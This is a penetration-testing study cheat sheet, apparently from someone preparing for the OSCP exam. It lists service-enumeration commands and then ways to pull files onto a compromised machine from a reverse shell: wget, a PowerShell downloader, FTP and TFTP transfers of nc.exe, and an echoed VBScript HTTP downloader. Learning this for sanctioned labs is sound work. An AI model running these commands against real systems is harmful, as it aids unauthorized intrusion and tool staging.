---
title: OSCP Cheat Sheet
date: 2020-06-28 15:30:00
description: Originally created June 21, 2020
featured_image: '/images/blog/oscp/oscp.jpg'
---

As I’m studying for the OSCP certification exam, I decided to write all of the commands and techniques I have used during PWK labs and similar machines. This list is still a work in progress, so if you have any methods or tips that are missing from this list, please let me know!

## Enumeration

In the enumeration section, you'll find information on the different ways to enumerate a service. 

### DNS (53/tcp)

The Domain Name System (DNS) is responsible for translating domain names into IP addresses. By using DNSRecon, we can automate DNS enumeration.

	dnsrecon -d <TARGET>

### SMB (139/tcp and 445/tcp)

The Server Message Block (SMB) is a protocol used to share resources like files, printers, etc. There are a number of tools that we can use to complete SMB enumeration.

**nmblookup**

The nmblookup tool collects NetBIOS over TCP/IP client used to lookup NetBIOS names. The `-A` option allows the ability to lookup a specific IP address.

	nmblookup -A <TARGET>

**nmap scripts**

Nmap contains many useful NSE scripts, for SMB there are: 
* `smb-enum-shares` = finds open SMB shares.
* `smb-os-discovery` = determine OS of SMB service.
* `smb-enum-users` = enumerate the SMB users.

To use nmap scripts, enter into Kali terminal:

	nmap -v -p 139,445 --script=<SCRIPT> <TARGET>

### NFS (111/tcp)

The Network File System (NFS), is a distributed file system protocol that allows users on a computer to access files over a network. 

If you find any NFS-related services, we can enumerate them by using NSE scripts. The `*` option acts as a wildcard, so it will allow us to run multiple nfs scripts. 

	nmap -p 111 --script nfs* <TARGET>

If there are any NFS shares, mount them by using the `mount` command along with `-o no lock` to disable file locking. It's also a good habit to check if you can read/write files or change the permissions too by creating a new user with a certain UID.

### SMPT (25/tcp)

The Simple Mail Transport Protocol (SMTP) supports *VRFY* and *EXPN*. They can be used to verify existing users on a mail server. Here's an example: 

	nc 10.11.1.217 25
	[...]
	VRFY root
	252 2.0.0 root
	VRFY idontexist
	550 5.1.1 <idontexist>: Recipient address rejected: User unknown in local recipient table

### SNMP (161/udp)

The Simple Network Management Protocol (SNMP) is based on UDP, and is suspectible to IP spoofing and replay attacks. To scan for SNMP ports, we can use the `nmap` tool. The `-sU` option is used to perform UDP scanning and the `--open` will only display open ports.

	sudo nmap -sU --open -p 161 <TARGET> 


## File Transfers

### HTTPS

This is probably the easiest way to transfer a file so I usually try this first. If this doesn't work, then I'll move down the list.

	# In Kali
	python -m SimpleHTTPServer 80

	# In reverse shell - Linux
	wget <HOST> /file

	# In reverse shell - Windows
	powershell -c "(new-object System.Net.WebClient).DownloadFile('<HOST>/file.exe','C:\Users\user\Desktop\file.exe')"

### FTP 

Windows has a built in FTP client at C:\Windows\System32\ftp.exe so this option *should* work. If not, there are other options down below.

	# In Kali
	python -m pyftpdlib -p 21 -w

	# In reverse shell
	echo open <HOST> > ftp.txt
	echo USER anonymous >> ftp.txt
	echo ftp >> ftp.txt 
	echo bin >> ftp.txt
	echo GET file >> ftp.txt
	echo bye >> ftp.txt

	# Execute
	ftp -v -n -s:ftp.txt

### TFTP

Use TFTP when completing a file transfer on older Windows versions like Windows XP and Windows Server 2003 as Powershell may not be installed. 

	# In Kali
	atftpd --daemon --port 4444 /tftp

	# In reverse shell
	tftp -i 10.10.10.10 GET nc.exe

### VBScript

When FTP/TFTP doesn't work, we can use this to download files to the target's machine. The `echo` command will write out a **wget.vbs** script that acts as a HTTP downloader.

	# In reverse shell
	echo strUrl = WScript.Arguments.Item(0) > wget.vbs
	echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
	echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
	echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
	echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
	echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
	echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
	echo Err.Clear >> wget.vbs
	echo Set http = Nothing >> wget.vbs
	echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
	echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
	echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
	echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
	echo http.Open "GET",strURL,False >> wget.vbs
	echo http.Send >> wget.vbs
	echo varByteArray = http.ResponseBody >> wget.vbs
	echo Set http = Nothing >> wget.vbs
	echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
	echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
	echo strData = "" >> wget.vbs
	echo strBuffer = "" >> wget.vbs
	echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
	echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
	echo Next >> wget.vbs
	echo ts.Close >> wget.vbs

	# Execute
	cscript wget.vbs <HOST>/file.exe file.exe
